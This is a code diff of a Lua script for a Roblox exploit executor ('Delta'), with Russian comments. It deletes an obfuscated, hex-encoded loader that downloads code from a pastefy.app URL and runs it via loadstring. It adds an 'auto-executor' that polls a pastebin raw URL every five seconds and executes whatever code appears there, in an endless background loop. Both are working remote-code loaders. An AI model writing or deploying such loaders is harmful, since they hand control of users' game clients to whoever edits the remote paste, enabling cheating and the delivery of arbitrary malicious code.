@@ -106,13 +106,86 @@ if not ok then
     warn("[Loader] ❌ Ошибка загрузки: " .. tostring(err))
 end
 
+-- ============================================
+-- Pastebin Auto-Executor для Delta Executor
+-- ============================================
+local PASTEBIN_URL = "https://pastebin.com/raw/kKRdR0k5"
+local INTERVAL     = 5       -- опрос каждые 5 секунд
+-- ============================================
+
+-- Универсальный HTTP-запрос с таймаутом (фикс зависаний Delta)
+local function safeHttpGet(url)
+    local body = nil
+    local done = false
+
+    -- Запускаем запрос в отдельном потоке
+    task.spawn(function()
+        local ok, res = pcall(function()
+            -- Перебираем все известные Delta методы запроса
+            if syn and syn.request then
+                return syn.request({Url = url, Method = "GET"}).Body
+            elseif http and http.request then
+                return http.request({Url = url, Method = "GET"}).Body
+            elseif request then
+                return request({Url = url, Method = "GET"}).Body
+            elseif http_request then
+                return http_request({Url = url, Method = "GET"}).Body
+            elseif Delta and Delta.request then
+                return Delta.request({Url = url, Method = "GET"}).Body
+            elseif game and game.HttpGet then
+                return game:HttpGet(url)
+            end
+        end)
+        if ok then body = res end
+        done = true
+    end)
+
+    -- Ждём ответа максимум 4 секунды (чтобы не «съесть» весь интервал)
+    local start = tick()
+    while not done and (tick() - start) < 4 do
+        task.wait(0.1)
+    end
+
+    return body
+end
+
+local lastCode = ""
+
+local function pollAndRun()
+    local raw = safeHttpGet(PASTEBIN_URL)
+
+    -- Пропускаем, если ответа нет, пусто или это HTML-страница
+    if not raw or raw == "" or raw:sub(1, 1) == "<" then
+        return
+    end
+
+    -- Не запускаем, если код не изменился
+    if raw == lastCode then
+        return
+    end
+
+    lastCode = raw
+
+    -- Выполняем полученный код
+    local chunk, compileErr = loadstring(raw)
+    if not chunk then
+        warn("[AutoExec] Ошибка компиляции: " .. tostring(compileErr))
+        return
+    end
+
+    local success, runErr = pcall(chunk)
+    if not success then
+        warn("[AutoExec] Ошибка выполнения: " .. tostring(runErr))
+    else
+        print("[AutoExec] Код обновлён и выполнен.")
+    end
+end
+
+-- Бесконечный цикл (работает в фоне и не блокирует основной скрипт)
 task.spawn(function()
-    local _0x1={0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x70,0x61,0x73,0x74,0x65,0x66,0x79,0x2e,0x61,0x70,0x70,0x2f,0x48,0x30,0x35,0x32,0x39,0x30,0x46,0x55,0x2f,0x72,0x61,0x77}
-    local _0x2=string.char
-    local _0x3=""
-    for _0x4=1,#_0x1 do _0x3=_0x3.._0x2(_0x1[_0x4]) end
-    local _0x5=loadstring or load
-    local _0x6=game
-    local _0x7=_0x6.HttpGet
-    _0x5(_0x7(_0x6,_0x3))()
+    task.wait(1) -- небольшая пауза перед первым запуском
+    while true do
+        pollAndRun()
+        task.wait(INTERVAL)
+    end
 end)
